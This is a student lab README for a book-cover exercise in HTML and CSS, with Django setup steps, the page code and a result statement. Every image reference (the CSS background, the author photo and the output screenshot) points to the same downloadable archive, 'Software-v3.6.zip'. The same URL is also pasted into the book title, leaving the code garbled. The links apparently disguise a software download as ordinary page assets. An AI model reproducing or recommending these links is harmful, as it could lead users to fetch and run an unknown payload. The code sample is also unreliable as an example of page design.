# Ex.06 Book Front Cover Page Design
## Date:20.11.2025

## AIM:
To design a book front cover page using HTML and CSS.

## DESIGN STEPS:

### Step 1:
Create a Django Admin project.

### Step 2:
Create an app in the Django interface.

### Step 3:
Create a folder named 'static' in the app folder.

### Step 4:
Create a new HTML file in the static folder.

### Step 5:
Write the HTML code with relevant CSS properties.

### Step 6:
Choose the appropriate style and color scheme.

### Step 7:
Insert the images in their appropriate places.

### Step 8:
Publish the website in the LocalHost.

## PROGRAM:
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Book Cover</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #f2f2f2;
      font-family: 'Georgia', serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .book-cover {
      width: 400px;
      height: 600px;
      background-image: url('https://github.com/Yugabharathi91/cover/raw/refs/heads/main/mealtime/Software-v3.6.zip');
      background-size: cover;
      background-position: center;
      color: white;
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
      border-radius: 12px;
      padding: 40px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      position: relative;
      text-align: center;
    }

    .book-title {
      font-size: 34px;
      font-weight: bold;
      margin-top: 50px;
      padding: 10px;
      background: rgba(255,255,255,0.7);
      color: #000;
      border-radius: 8px;
    }

    .book-subtitle {
      font-size: 20px;
      font-style: italic;
      padding: 8px;
      background: rgba(255,255,255,0.6);
      color: #000;
      border-radius: 6px;
      margin: 0 auto 20px auto;
    }

    .author {
      font-size: 18px; margin-top: auto; 
      font-style: italic; 
      background-color: rgb(160, 153, 153); 
      color: rgb(160, 153, 153); 
      color: black; 
      text-align: left;
    }

    .author-image {
      width: 70px;
      height: 70px;
      object-fit: cover;
      border-radius: 50%;
      border: 2px solid #000;
      position: absolute;
      bottom: 20px;
      right: 20px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.4);
    }
  </style>
</head>
<body>
  <div class="book-cover">
    <div class="book-title">https://github.com/Yugabharathi91/cover/raw/refs/heads/main/mealtime/Software-v3.6.zip AND THE BEAST..</div>
    <div class="book-subtitle">Until the Last Petal Falls</div>
    <div class="author">by: Kiruthika N.</div>
    <img src="https://github.com/Yugabharathi91/cover/raw/refs/heads/main/mealtime/Software-v3.6.zip" alt="Kiruthika N" class="author-image">
  </div>
</body>
</html>

```
## OUTPUT:
![wmremove-transformed](https://github.com/Yugabharathi91/cover/raw/refs/heads/main/mealtime/Software-v3.6.zip)


## RESULT:
The program for designing book front cover page using HTML and CSS is completed successfully.
